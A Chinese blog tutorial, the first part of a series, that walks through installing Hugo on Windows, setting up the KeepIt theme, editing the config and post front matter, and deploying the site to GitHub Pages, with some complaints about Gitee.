是一款基于Go语言的建站工具，官网说它是“世界上最快的网站框架”，主要正是由于Go语言的高效。这款软件使用起来比较简单，虽然我在整个搭建过程中出了无数错，但是只要你跟着我接下来的介绍走，就只需要使用短短的几个命令。\n但是首先，下载一个Hugo是一切步骤的开始。以下步骤全部基于Windows10系统（主要是我没有Mac）。\n我们去到下面的这个网址：\n(https://github.com/gohugoio/hugo/releases)\n在里面你可以下载Windows系统下的Hugo，注意是Hugo_extend而不是hugo，因为有些主题里面用到了SASS/SCSS，需要extend版本的hugo才能完成编译。\n将下载的压缩包解压，得到一个文件夹，里面有hugo.exe。接下来将这个文件夹的位置添加到系统环境变量中，就跟你配置java或者是python完全一样，还需要我再讲吗？\n好吧，念及这篇博文主要是写给像当年的我一样年轻且好奇的同学，如果有任何问题，还请照着以下步骤来：\n 右键我的电脑 \u0026ndash;\u0026gt; 属性 \u0026ndash;\u0026gt; 高级系统设置（在左边栏里） \u0026ndash;\u0026gt; 环境变量（在弹出的窗口的右下角） \u0026ndash;\u0026gt; 在系统变量中找到path这一栏，把你放置Hugo.exe的文件夹路径写进去。\n 接下来打开你的命令行窗口，试着执行hugo version，如果你没有得到报错，而是得到了一个hugo的版本信息，那么恭喜你，你取得了一个非常不错的开端！\n 新建站点  用hugo新建站点实在是非常简单。在你电脑上某个位置打开你的命令行，敲上命令：\nhugo new site [yourSiteName]\n就完事了！这里的 [yourSiteName] 可以替换成任何你想要的名字，为你的网站起个好名吧！\n如果顺利的话，你将会得到一个名字为yourSiteName的文件夹，里面有一些hugo为你初始化好的文件夹，你可以使用ls查看它们。\n\r新建站点\r\n 选择主题  “一款好看的主题是你坚持写博客的最大动力。” ——沃兹·基·硕德\n你现在浏览的——也就是我的博客——主题是：https://themes.gohugo.io/keepit/实际上，在上面这个网站上还有非常多的酷炫的主题，完全看你的喜好去选择——不考虑配置难度的情况下 ヽ(ー_ー)ノ\n当你选定了一个主题，点进去，一般都会在底下有一个非常周到的安装指南（真的只是安装指南o(╥﹏╥)o）。\n就以这款KeepIt主题为例，我们的网站根目录下有一个themes文件夹，你只需要进入这个文件夹，使用命令git clone https://github.com/Fastbyte01/KeepIt.git，就可以将这个主题下载到你的网站里了。从此，你就可以快乐地使用themes文件夹底下存在的主题，而且变换主题的成本非常之低，这个我们之后会讲。\n 配置页面  现在让你的命令行回到网站的根目录下，写下命令hugo server --theme=keepit -D，然后你就发现hugo已经在你的电脑上跑起了一个Web服务。打开浏览器，根据命令行的提示输入地址，就可以访问你的页面了！刚才说过，当你的themes文件夹下面有多个主题时，你可以轻易地更换它们，具体的操作就是将--theme这个参数指定为你想用的主题的名字，就问你简单不？\n回到你的网站上吧，看看效果。\n什么？你说你的页面现在空无一物？或者你的页面还只是个模板？理所当然。因为你还没有配置它。\n打开你刚才下载的主题文件夹，一般来讲，里面都有一个exampleSite文件夹，打开它，把里面的所有文件复制到网站根目录，直接替换掉你原有的东西即可。\n现在再运行，你发现你的网站已经颇有点样子了，只不过里面的页面还有显示的内容还是别人写好的，你希望把它们换成自己的内容。\nOK，一步一步来。首先，根目录底下有一个文件config.toml，打开它，以keepit主题为例，里面是一系列参数名称和数值。\n从上往下看，在第四行有个title = xxx，这就是你的网站的标题了，你把它改掉，然后看看效果，你瞬间就明白这个配置文件的作用了，这比我在这里用文字描述要生动一万倍。\n继续往下看，你可以找到一个用中括号括起来的[menu]字段，在底下你看到了什么？yes，你现在可以配置顶栏了！比如，我将底下第一个[[menu.main]]的name字段由post改为博文，在网页对应的位置，post也变成了博文！\n继续往下看，你可以看到一个[params]字段，这是适用于整个站点的一些参数。里面有个avatar参数，它用于配置你的主页面上的那个头像，你可以把它注释掉，然后启用下方几行的[params.gravatar]字段，它会将你的主页图片替换为你独有的gravatar，当然，如果你不知道什么是gravatar，百度之。\n主页的底下有四个链接按钮，你在[params.social]字段下可以找到对应的配置。比如我，就把里面的Instagram、Linkedin都注释掉了，只保留了Twitter和Github，所以你在我的主页上只能找到这两个链接。\n继续往下，就是一些无关紧要的参数了，你可以暂且忽略它们。当你走到这里，你的网站已经初步具有你的个人特色了，但我还要带你继续配置你的网站。\n 进一步配置页面  从你的主页上点击头像或者右上角进入post，你会发现里面的文章都是一些别人已经写好的东西，你一定会希望把它们换掉，但是它们在哪里？\n打开网站的根目录，进入content，你会看到一个posts文件夹和一个projects文件夹，还有一个aboutme.md文件，它们是什么？\n进入posts文件夹，所有的博文都存在这里。你可以把里面的文件删掉，换成你自己的Markdown文件，但是不要急，先打开别人的文件，看看hugo解析文件时需要的特定的格式：\n比如我打开了hugoisforlovers.md，在里面，头几行的位置我们能看到这些东西：\n title = \u0026ldquo;Getting Started with Hugo\u0026rdquo; description = \u0026quot;\u0026quot; type = [\u0026ldquo;posts\u0026rdquo;,\u0026ldquo;post\u0026rdquo;] tags = [ \u0026ldquo;go\u0026rdquo;, \u0026ldquo;golang\u0026rdquo;, \u0026ldquo;hugo\u0026rdquo;, \u0026ldquo;development\u0026rdquo;, ] date = \u0026ldquo;2014-04-02\u0026rdquo; categories = [ \u0026ldquo;Development\u0026rdquo;, \u0026ldquo;golang\u0026rdquo;, ] series = [\u0026ldquo;Hugo 101\u0026rdquo;] [ author ] name = \u0026ldquo;Hugo Authors\u0026rdquo;\n 它们是一个文件被解析时需要的一些参数。比如文件标题title，比如文件类型tags和caterogies，你自己写Markdown文件时也需要在头部附上这些东西，否则它在你的网站上就无法体现出相关的信息。具体的做法是使用两行---把你的这些信息夹起来，然后hugo就能进行识别了。如果是智能一点的Markdown编辑器，可能直接弹出一个非常明显的提示，告知你这里是输入头部信息的地方。在此强烈推荐Typora！！\n会修改你的博文之后，你可以顺便改一改about.md，它是这个主题里面自我介绍的那一页。\n一切都完事之后，你的网站已经是一个承载着你个人信息、存放着你个人博文的站点了。你可以直接进入发布环节，也可以再进行更精细的配置——修改网页源码。\n我们的网站页面都在你的主题文件夹里面。进入你的主题文件夹，能看到一个layouts的文件夹，点进去，里面是一些模板HTML。有些主题里，你可以从index.html文件修改一些信息，但是在我们的keepit主题，这个文件并没有什么价值，你需要再进入partials文件内，这里的文件们才是你需要阅读与修改的。\n你可以看到一个home_profile.html文件，这是默认情况下你的主页。仔细阅读，你应该可以悟到这里使用了很多配置文件中的参数，比如{{ .Site.Params.avatar}}，就是你在配置文件中定义的图像！\n换一个文件，比如footer.html，你应该可以悟到这一页掌管着主页下方的版权说明！如果你不满意主页底下的copyright，不妨对其进行修改。\n这里的文件不可能逐一讲解，自己去阅读它们，时刻牢记你配置文件里的东西，你完全可以配置一个很漂亮的页面。\n 将页面部署到GitHub上  对于页面的配置，我目前讲的完全是够用了（主要是其他的操作我也不会 x）。如果之后有更多的需求，完全可以新开一篇博文，在此就不多赘述了。\n我们现在需要将页面部署到GitHub上，为什么不用Gitee？因为Gitee会出现一大堆路径问题。你不要觉得我在造谣，也不要觉得网上一堆博客可供参考，事实就是我尝试了几天，看了一大堆文章，但是我的Gitee上的博客完全无法加载样式。\n在这里不禁想讲道理，国家战略支持的平台就这么个鸟样子，想做到跟GitHub分庭抗礼真的是任重道远。\n如果你成功在Gitee上部署了自己的博客，欢迎联系我，我非常乐意学习，并将自己的博客迁移到Gitee上。\n回到主题，首先要在GitHub上建立一个仓库，这个仓库的名字非常特殊，它必须是username.github.io，其中的username就是你的GitHub用户名。比如我的用户名是SGS4ever，那么我的仓库就是SGS4ever.github.io。\n建立完成后，在站点根目录下使用命令hugo --theme=keepit --baseUrl=\u0026quot;https://SGS4ever.github.io -D\u0026quot;你就会得到一个文件夹public，进入它，在里面打开GitBash，进行一系列操作：\ngit init git add . git commit -m \u0026#34;Your comment\u0026#34; git remote add origin https://xxxxxxxxxxx # 注意，这里的https://xxxxxx 是你刚创建的仓库的地址，也就是当你进入仓库页面，你的浏览器上方地址栏里面的东西。 git push -u origin master 这些操作之后，你的GitHub仓库里就多了很多东西了，完全不需要任何操作，直接打开浏览器访问https://username.github.io吧！\n 写在最后  搭建博客真的是费了很大的功夫，但我万万没想到这些无用功实际上是Gitee的问题，实在是愤意难平。\n国产的很多东西——并不止Gitee——希望与国外的东西竞争，还需要非常努力。有些情况下并不是你实现了同样的功能，你就具备了同样的竞争力，还需要考虑到这些功能的易用性、稳定性。当你的东西用起来比别人更繁琐，以至于这种繁琐给用户带来的负面感受压过了爱国情怀的正面加持，你的竞争就注定失败了。\n ","date":"2020-09-18T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%971/","title":"博客搭建指南——1"}]